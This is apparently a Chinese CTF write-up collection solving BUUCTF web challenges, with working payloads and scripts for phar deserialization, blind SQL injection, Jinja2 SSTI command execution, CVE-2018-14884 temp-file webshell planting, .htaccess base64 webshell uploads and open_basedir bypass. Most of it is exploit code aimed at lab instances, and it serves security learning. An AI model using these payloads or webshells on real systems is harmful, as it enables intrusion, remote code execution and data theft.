{ global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\u0026#34;gif\u0026#34;,\u0026#34;jpeg\u0026#34;,\u0026#34;jpg\u0026#34;,\u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;,$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $extension = end($temp); if(empty($extension)) { //echo \u0026#34;\u0026lt;h4\u0026gt;请选择上传的文件:\u0026#34; . \u0026#34;\u0026lt;h4/\u0026gt;\u0026#34;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;Invalid file!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; return false; } } } ?\u0026gt; class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 \u0026lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-\u0026gt;str = $name; } public function __destruct() { $this-\u0026gt;test = $this-\u0026gt;str; echo $this-\u0026gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-\u0026gt;source = $file; //$this-\u0026gt;source = phar://phar.jpg echo $this-\u0026gt;source; } public function __toString() { $content = $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; return $content; } public function __set($key,$value) { $this-\u0026gt;$key = $value; } public function _show() { if(preg_match(\u0026#39;/http|https|file:|gopher|dict|\\.\\.|f1ag/i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;hacker!\u0026#39;); } else { highlight_file($this-\u0026gt;source); } } public function __wakeup() { if(preg_match(\u0026#34;/http|https|file:|gopher|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker~\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $file; public $params; public function __construct() { $this-\u0026gt;params = array(); } public function __get($key) { return $this-\u0026gt;get($key); } public function get($key) { if(isset($this-\u0026gt;params[$key])) { $value = $this-\u0026gt;params[$key]; } else { $value = \u0026#34;index.php\u0026#34;; } return $this-\u0026gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?\u0026gt; 打pop链加phar反序列化\n先找利用点Test类里面的file_get函数能读取文件内容，要触发__get方法，找到show类里面的__toString然后在C1e4r类里面有echo触发\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;?php class C1e4r { public $str; } class Show { public $str; public function __construct() { $this-\u0026gt;str[\u0026#39;str\u0026#39;]=new Test(); } } class Test { public $params; public function __construct() { $this-\u0026gt;params = array(\u0026#34;source\u0026#34; =\u0026gt; \u0026#34;/var/www/html/f1ag.php\u0026#34;); } } $o=new C1e4r(); $o-\u0026gt;str=new Show(); @unlink(\u0026#34;phar.phar\u0026#34;); //生成phar时，文件的后缀名必须为phar $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //设置stub $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); //将自定义的meta-data存入manifest，这个是利用的重点 $phar-\u0026gt;setMetadata($o); //添加要压缩的文件，这个文件可以不存在，但这句语句不能少 $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 上传后查看upload路由\n然后在file.php里面有file_exists函数可以触发反序列化\nOctober 2019 Twice SQL Injection 题目叫二次注入\n1 2 3 4 5 6 7 1\u0026#39; union select database()# 1\u0026#39; union select group_concat(table_name)from information_schema.tables where table_schema=database()# 1\u0026#39; union select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;flag\u0026#39;# 1\u0026#39; union select (select group_concat(flag)from flag)# [GYCTF2020]Ezsqli 无列名注入\n爆表\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import time import requests import sys import string import logging # LOG_FORMAT = \u0026#34;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s\u0026#34; # logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT) target=\u0026#34;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php\u0026#34; dataStr=\u0026#34;(select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database())\u0026#34; def binaryTest(i,cu,comparer): s=requests.post(target,data={\u0026#34;id\u0026#34; : \u0026#34;0^(ascii(substr({},{},1)){comparer}{})\u0026#34;.format(dataStr,i,cu,comparer=comparer)}) if \u0026#39;Nu1L\u0026#39; in s.text: return True else: return False def searchFriends_sqli(i): l = 0 r = 255 while (l \u0026lt;= r): cu = (l + r) // 2 if (binaryTest(i, cu, \u0026#34;\u0026lt;\u0026#34;)): r = cu - 1 elif (binaryTest(i, cu, \u0026#34;\u0026gt;\u0026#34;)): l = cu + 1 elif (cu == 0): return None else: return chr(cu) def main(): print(\u0026#34;start\u0026#34;) finres=\u0026#34;\u0026#34; i=1 while (True): extracted_char = searchFriends_sqli(i) if (extracted_char == None): break finres += extracted_char i += 1 print(\u0026#34;(+) 当前结果:\u0026#34;+finres) print(\u0026#34;(+) 运行完成,结果为:\u0026#34;, finres) if __name__==\u0026#34;__main__\u0026#34;: main() 爆flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import requests import time url = \u0026#39;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php\u0026#39; # give_grandpa_pa_pa_pa payload_flag = \u0026#39;1^((1,\\\u0026#39;{}\\\u0026#39;)\u0026gt;(select * from f1ag_1s_h3r3_hhhhh))\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1, 100): time.sleep(0.3)#这里要sleep一下，不然太快了会乱码，本人测试后0.3正好能出结果 low = 32 high = 132 mid = (low + high) // 2 while (low \u0026lt; high): k = flag + chr(mid) payload = payload_flag.format(k) data = {\u0026#34;id\u0026#34;: payload} print(payload) r = requests.post(url=url, data=data) if \u0026#39;Nu1L\u0026#39; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 33: break flag += chr(mid - 1) print(flag.lower()) # 因为出来的flag是大写，这边全部转为小写 print(flag.lower()) [CISCN2019 总决赛 Day2 Web1]Easyweb 有robots.txt，查看image.php.bak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php include \u0026#34;config.php\u0026#34;; $id=isset($_GET[\u0026#34;id\u0026#34;])?$_GET[\u0026#34;id\u0026#34;]:\u0026#34;1\u0026#34;; $path=isset($_GET[\u0026#34;path\u0026#34;])?$_GET[\u0026#34;path\u0026#34;]:\u0026#34;\u0026#34;; $id=addslashes($id); $path=addslashes($path); $id=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$id); $path=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$path); $result=mysqli_query($con,\u0026#34;select * from images where id=\u0026#39;{$id}\u0026#39; or path=\u0026#39;{$path}\u0026#39;\u0026#34;); $row=mysqli_fetch_array($result,MYSQLI_ASSOC); $path=\u0026#34;./\u0026#34; . $row[\u0026#34;path\u0026#34;]; header(\u0026#34;Content-Type: image/jpeg\u0026#34;); readfile($path); 要单引号尝试注入，这里看到id先经过addslashes函数转义然后再被str_replace替换为空\n我们直接在id这里用\\\\0这样\\0会被转义成\\\\0，然后又被替换成空，最后剩个\\把后面的单引号转义\n可以看界面有无JFIF字符串判断是否有图片\npayload\n1 image.php?id=\\\\0\u0026amp;path=or ascii(substring(database(),%s,1))=%s # 盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import requests url = \u0026#34;http://727bcaec-8c37-47b6-8428-161fcbeeeb42.node5.buuoj.cn:81/image.php?id=\\\\0\u0026amp;path=\u0026#34; payload = \u0026#34; or ascii(substr((select password from users),{},1))\u0026gt;{}%23\u0026#34; result = \u0026#39;\u0026#39; for i in range(1,100): high = 127 low = 32 mid = (low+high) // 2 # print(mid) while(high\u0026gt;low): r = requests.get(url + payload.format(i,mid)) # print(url + payload.format(i,mid)) if \u0026#39;JFIF\u0026#39; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 result += chr(mid) print(result) 用户名admin，密码84582e71d43b59c72f38\n进来是一个文件上传\n随便上传发现上传到日志去了，直接文件名写木马,日志文件包含\n[RootersCTF2019]I_\u0026lt;3_Flask 肯定打ssti，爆参数\n1 {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[182].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39;)}} 抄一个别人的\n1 ?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026#34;) }}{% endif %}{% endfor %} [NPUCTF2020]ezinclude 上来先看源码\n由于不知道$secret的值，我们先传个name看看\n把响应的hash填入发包\n1 ?name=1\u0026amp;pass=576322dd496b99d07b5b0f7fa7934a25 有个flflflflag.php\n伪协议读文件\n1 ?file=php://filter/read=convert.base64-encode/resource=flflflflag.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.location.href=\u0026#34;404.html\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;title\u0026gt;this_is_not_fl4g_and_出题人_wants_girlfriend\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php $file=$_GET[\u0026#39;file\u0026#39;]; if(preg_match(\u0026#39;/data|input|zip/is\u0026#39;,$file)){ die(\u0026#39;nonono\u0026#39;); } @include($file); echo \u0026#39;include($_GET[\u0026#34;file\u0026#34;])\u0026#39;; ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 目录扫描会发现dir.php\n1 2 3 \u0026lt;?php var_dump(scandir(\u0026#39;/tmp\u0026#39;)); ?\u0026gt; 然后\n法一：利用php7 segment fault特性（CVE-2018-14884） php代码中使用php://filter的 strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。\n使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，知道文件名就可以getshell。这个崩溃原因是存在一处空指针引用。向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留，临时文件会被保存在upload_tmp_dir所指定的目录下，默认为tmp文件夹。\n该方法仅适用于以下php7版本，php5并不存在该崩溃。\n1 2 3 4 5 php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复 php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复 php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复 利用url\n1 /flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd 打这个cve\n1 2 3 4 5 6 import requests from io import BytesIO #BytesIO实现了在内存中读写bytes payload = \u0026#34;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#34; data={\u0026#39;file\u0026#39;: BytesIO(payload.encode())} url=\u0026#34;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\u0026#34; r=requests.post(url=url,files=data,allow_redirects=False) 这样就在tmp目录下写入木马了\n我们用dir.php查看位置\n1 http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=/tmp/php3r0kqs 连接上用蚁剑插件绕过，发现不行，bp在post传参cmd=phpinfo()看看，直接搜flag就有了\n法二：利用 session.upload_progress 进行 session 文件包含 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import io import re import sys import requests import threading host = \u0026#39;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php\u0026#39; sessid = \u0026#39;yym68686\u0026#39; def POST(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 1024 * 50) session.post( host, data={\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34;:\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;}, files={\u0026#34;file\u0026#34;:(\u0026#39;a.txt\u0026#39;, f)}, cookies={\u0026#39;PHPSESSID\u0026#39;:sessid} ) def READ(session): while True: response = session.get(f\u0026#39;{host}?file=/tmp/sess_{sessid}\u0026#39;) if \u0026#39;flag{\u0026#39; not in response.text: print(\u0026#39;\\rWaiting...\u0026#39;, end=\u0026#34;\u0026#34;) else: print(\u0026#34;\\r\u0026#34; + re.search(r\u0026#39;flag{(.*?)}\u0026#39;, response.text).group(0)) sys.exit(0) with requests.session() as session: t1 = threading.Thread(target=POST, args=(session, )) t1.daemon = True t1.start() READ(session) [NCTF2019]SQLi 有个robots.txt\n这里waf了一堆关键字,用户名是admin\n主要用regexp正则来绕过\npayload\n1 select * from users where username=\u0026#39;\\\u0026#39; and passwd=\u0026#39;||/**/passwd/**/regexp/**/\\\u0026#34;^a\\\u0026#34;;%00\u0026#39; 1 payload: username=\\\u0026amp;passwd=||passwd/**/regexp/**/\u0026#34;^a\u0026#34;;%00 通过\\ 转义username后第二个单引号进而闭合掉passwd后第一个引号 通过%00截断 代替# – regexp “^a” 表示 查找passwd列中以a为起始的 如果注入成功会回显welcome.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import requests from urllib.parse import unquote import string url = \u0026#39;http://eec98765-3741-49a5-8773-6d1b31843e2e.node5.buuoj.cn:81/\u0026#39; cookies = { \u0026#39;UM_distinctid\u0026#39;: \u0026#39;17e150f6a59ecb-028dcf28d64a708-4c3e2679-384000-17e150f6a5a90d\u0026#39;, } headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, \u0026#39;Origin\u0026#39;: \u0026#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;, \u0026#39;Referer\u0026#39;: \u0026#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81/\u0026#39;, \u0026#39;Upgrade-Insecure-Requests\u0026#39;: \u0026#39;1\u0026#39;, } table = string.ascii_letters + string.digits + \u0026#39;_{}\u0026#39; flag = \u0026#39;\u0026#39; for j in range(50): for i in table: data = { \u0026#39;username\u0026#39;: \u0026#39;\\\\\u0026#39;, \u0026#39;passwd\u0026#39;: f\u0026#39;||(passwd/**/regexp/**/\u0026#34;^{flag + i}\u0026#34;);\u0026#39; + unquote(\u0026#39;%00\u0026#39;) } response = requests.post(url, headers=headers, cookies=cookies, data=data) if \u0026#39;404 Not Found\u0026#39; in response.text: flag = flag + i break else: continue print(str.lower(flag)) [网鼎杯 2020 半决赛]AliceWebsite index.php\n1 2 3 4 5 6 7 8 \u0026lt;?php $action = (isset($_GET[\u0026#39;action\u0026#39;]) ? $_GET[\u0026#39;action\u0026#39;] : \u0026#39;home.php\u0026#39;); if (file_exists($action)) { include $action; } else { echo \u0026#34;File not found!\u0026#34;; } ?\u0026gt; 有文件包含，然后用目录穿越读到flag\n[HarekazeCTF2019]encode_and_encode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php error_reporting(0); if (isset($_GET[\u0026#39;source\u0026#39;])) { show_source(__FILE__); exit(); } function is_valid($str) { $banword = [ // no path traversal \u0026#39;\\.\\.\u0026#39;, // no stream wrapper \u0026#39;(php|file|glob|data|tp|zip|zlib|phar):\u0026#39;, // no data exfiltration \u0026#39;flag\u0026#39; ]; $regexp = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $banword) . \u0026#39;/i\u0026#39;; if (preg_match($regexp, $str)) { return false; } return true; } $body = file_get_contents(\u0026#39;php://input\u0026#39;); $json = json_decode($body, true); if (is_valid($body) \u0026amp;\u0026amp; isset($json) \u0026amp;\u0026amp; isset($json[\u0026#39;page\u0026#39;])) { $page = $json[\u0026#39;page\u0026#39;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) { $content = \u0026#34;\u0026lt;p\u0026gt;not found\u0026lt;/p\u0026gt;\\n\u0026#34;; } } else { $content = \u0026#39;\u0026lt;p\u0026gt;invalid request\u0026lt;/p\u0026gt;\u0026#39;; } // no data exfiltration!!! $content = preg_replace(\u0026#39;/HarekazeCTF\\{.+\\}/i\u0026#39;, \u0026#39;HarekazeCTF{\u0026amp;lt;censored\u0026amp;gt;}\u0026#39;, $content); echo json_encode([\u0026#39;content\u0026#39; =\u0026gt; $content]); unicode编码绕过正则匹配，因为json_decode时会把unicode编码转码\njson格式的page传伪协议读flag\n1 2 {\u0026#34;page\u0026#34;:\u0026#34;php://filter/convert.base64-encode/resource=/flag\u0026#34;} {\u0026#34;page\u0026#34;:\u0026#34;\\u0070\\u0068\\u0070\\u003A\\u002F\\u002F\\u0066\\u0069\\u006C\\u0074\\u0065\\u0072\\u002F\\u0063\\u006F\\u006E\\u0076\\u0065\\u0072\\u0074\\u002E\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002D\\u0065\\u006E\\u0063\\u006F\\u0064\\u0065\\u002F\\u0072\\u0065\\u0073\\u006F\\u0075\\u0072\\u0063\\u0065\\u003D\\u002F\\u0066\\u006C\\u0061\\u0067\u0026#34;} [SUCTF 2019]EasyWeb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;?php function get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = \u0026#34;upload/tmp_\u0026#34;.md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[\u0026#34;file\u0026#34;])){ $tmp_name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]; $name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $extension = substr($name, strrpos($name,\u0026#34;.\u0026#34;)+1); if(preg_match(\u0026#34;/ph/i\u0026#34;,$extension)) die(\u0026#34;^_^\u0026#34;); if(mb_strpos(file_get_contents($tmp_name), \u0026#39;\u0026lt;?\u0026#39;)!==False) die(\u0026#34;^_^\u0026#34;); if(!exif_imagetype($tmp_name)) die(\u0026#34;^_^\u0026#34;); $path= $userdir.\u0026#34;/\u0026#34;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); } } $hhh = @$_GET[\u0026#39;_\u0026#39;]; if (!$hhh){ highlight_file(__FILE__); } if(strlen($hhh)\u0026gt;18){ die(\u0026#39;One inch long, one inch strong!\u0026#39;); } if ( preg_match(\u0026#39;/[\\x00- 0-9A-Za-z\\\u0026#39;\u0026#34;\\`~_\u0026amp;.,|=[\\x7F]+/i\u0026#39;, $hhh) ) die(\u0026#39;Try something else!\u0026#39;); $character_type = count_chars($hhh, 3); if(strlen($character_type)\u0026gt;12) die(\u0026#34;Almost there!\u0026#34;); eval($hhh); ?\u0026gt; 过滤了取反符号，只能异或来绕过写webshell\n异或脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php function finds($string){ $index = 0; $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255]; for($i=27;$i\u0026lt;count($a);$i++){ for($j=27;$j\u0026lt;count($a);$j++){ $x = $a[$i] ^ $a[$j]; for($k = 0;$k\u0026lt;strlen($string);$k++){ if(ord($string[$k]) == $x){ echo $string[$k].\u0026#34;\\n\u0026#34;; echo \u0026#39;%\u0026#39; . dechex($a[$i]) . \u0026#39;^%\u0026#39; . dechex($a[$j]).\u0026#34;\\n\u0026#34;; $index++; if($index == strlen($string)){ return 0; } } } } } } finds(\u0026#34;_GET\u0026#34;); ?\u0026gt; 1 2 ?.=${%80%80%80%80^%DF%C7%C5%D4}{%81}();\u0026amp;%81=phpinfo //这里.和_一样的 非预期是直接搜flag就出来了\n预期解利用get_the_flag函数\n文件上传部分过滤了拓展名ph，而且把\u0026lt;?过滤了，但是php7不能用script标签绕过了\nexif_imagetype不能简单用GIF89a绕过了，这里可以在.htaccess添加文件头\n1 2 #define width 1 #define height 1 1 2 3 或者在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型) x00x00x8ax39x8ax39 是wbmp文件的文件头 .htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess 利用php_value auto_append_file指定文件包含，然后就可以利用base64来进行绕过\u0026lt;?标签限制\n1 2 3 4 #define width 1 #define height 1 AddType application/x-httpd-php .jpg php_value auto_append_file \u0026#34;php://filter/convert.base64-decode/resource=./1.jpg\u0026#34; 然后在1.jpg里面写入base64的马\n1 2 GIF89abb PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4 这里因为base64解密是4位一解码，我们补上两个b凑四位\n利用脚本上传\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import requests import base64 htaccess = b\u0026#34;\u0026#34;\u0026#34; #define width 1337 #define height 1337 AddType application/x-httpd-php .jpg php_value auto_append_file \u0026#34;php://filter/convert.base64-decode/resource=./shell.jpg\u0026#34; \u0026#34;\u0026#34;\u0026#34; shell = b\u0026#34;GIF89abbPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4\u0026#34; url = \u0026#34;http://0e57dfd9-bd66-4101-8c76-8baa918b86bb.node5.buuoj.cn:81/?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();\u0026amp;%86=get_the_flag\u0026#34; files = {\u0026#39;file\u0026#39;:(\u0026#39;.htaccess\u0026#39;,htaccess,\u0026#39;image/jpeg\u0026#39;)} data = {\u0026#34;upload\u0026#34;:\u0026#34;Submit\u0026#34;} response = requests.post(url=url, data=data, files=files) print(response.text) files = {\u0026#39;file\u0026#39;:(\u0026#39;shell.jpg\u0026#39;,shell,\u0026#39;image/jpeg\u0026#39;)} response = requests.post(url=url, data=data, files=files) print(response.text) 出来路径\n1 2 upload/tmp_fc3f8d0d99ccdde85c8cfc624fe94c32/.htaccess upload/tmp_fc3f8d0d99ccdde85c8cfc624fe94c32/shell.jpg 蚁剑连接插件绕过\n或者写文件来读根目录下文件\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php mkdir(\u0026#39;img\u0026#39;); chdir(\u0026#39;img\u0026#39;); ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/\u0026#39;); var_dump(scandir(\u0026#39;/\u0026#39;)); ?\u0026gt; 读到之后\n1 echo file_get_contents(\u0026#34;/THis_Is_tHe_F14g\u0026#34;); [CISCN2019 华东南赛区]Double Secret 目录扫描扫出/console\n得算pin码了，但是信息不够\n回到原来界面，访问/secret路由\n传参secret，出现报错\nrc4加密\n1 2 3 4 5 6 7 8 9 10 if(secret==None): return \u0026#39;Tell me your secret.I will encrypt it so others can\\\u0026#39;t see\u0026#39; rc=rc4_Modified.RC4(\u0026#34;HereIsTreasure\u0026#34;) #解密 deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if \u0026#39;ciscn\u0026#39; in a.lower(): return \u0026#39;flag detected!\u0026#39; return a 打ssti然后用rc4加密，用cyberchef加密\n或者上脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import base64 from urllib.parse import quote def rc4_main(key = \u0026#34;init_key\u0026#34;, message = \u0026#34;init_message\u0026#34;): # print(\u0026#34;RC4加密主函数\u0026#34;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # print(\u0026#34;原来的 s 盒：%s\u0026#34; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\u0026#34;混乱后的 s 盒：%s\u0026#34;% s_box) return s_box def rc4_excrypt(plain, box): # print(\u0026#34;调用加密程序成功。\u0026#34;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = \u0026#34;\u0026#34;.join(res) print(\u0026#34;%s\u0026#34; %quote(cipher)) return (str(base64.b64encode(cipher.encode(\u0026#39;utf-8\u0026#39;)), \u0026#39;utf-8\u0026#39;)) rc4_main(\u0026#34;HereIsTreasure\u0026#34;,\u0026#34;{{lipsum.__globals__.__builtins__.eval(\\\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag.txt\u0026#39;).read()\\\u0026#34;)}}\u0026#34;) 1 2 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}} {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat /flag.txt\u0026#34;).read()\u0026#39;)}} [GKCTF 2021]easycms 目录扫描admin.php\n弱口令admin/12345登入\n在设计这里自定义可以编辑php代码\n/var/www/html/system/tmp/tgom.txt\n新建一个文件,上传后编辑\n文件名为../../../../../system/tmp/tgom\n然后回去编辑就行了，回到主页就能看到flag\n另一种做法，导出主题\n会提示下载，复制下载连接\n1 http://18f6826c-975b-4018-8d7c-014a078b56b0.node5.buuoj.cn:81/admin.php?m=ui\u0026amp;f=downloadtheme\u0026amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA= 把后面这串base64解码\n1 /var/www/html/system/tmp/theme/default/1.zip 我们改为/flag就行了\n然后下载得到flag\n[BJDCTF2020]EzPHP 看源码有base32编码，解码得1nD3x.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $file = \u0026#34;1nD3x.php\u0026#34;; $shana = $_GET[\u0026#39;shana\u0026#39;]; $passwd = $_GET[\u0026#39;passwd\u0026#39;]; $arg = \u0026#39;\u0026#39;; $code = \u0026#39;\u0026#39;; echo \u0026#34;\u0026lt;br /\u0026gt;\u0026lt;font 